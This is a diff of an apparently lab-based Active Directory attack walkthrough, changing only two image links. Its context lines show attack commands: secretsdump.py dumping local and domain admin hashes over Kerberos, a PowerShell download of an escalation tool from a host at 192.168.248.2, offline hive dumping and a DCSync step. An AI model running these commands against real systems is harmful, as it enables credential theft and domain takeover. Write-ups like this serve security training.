@@ -444,7 +444,7 @@ export KRB5CCNAME=administrator.ccache
 secretsdump.py -k -no-pass web01.amsterdam.bank.local
 ```
 
-![](<../../../.gitbook/assets/image (1) (1) (1) (3).png>)
+![](<../../../.gitbook/assets/image (1) (1) (1) (3) (1).png>)
 
 We retrieved the hash of the local `administrator` user and the cached hashes for two domain admins. These look like NTLM hashes but aren't. We can use the local admin hash though to authenticate to `WEB01`. We can do this with our good old tool `CrackMapExec`.
 
@@ -909,7 +909,7 @@ $WebClient.DownloadFile("http://192.168.248.2:8090/BackupOperatorToDA.exe","C:\u
 secretsdump.py LOCAL -system ~/adlab/share/SYSTEM -security ~/adlab/share/SECURITY -sam ~/adlab/share/SAM
 ```
 
-![](<../../../.gitbook/assets/image (18) (1) (1).png>)
+![](<../../../.gitbook/assets/image (18) (1) (1) (2).png>)
 
 6\. The last step is to run Secretsdump.py to run DCsync and retrieve all the domain account hashes using the computeraccount:
 
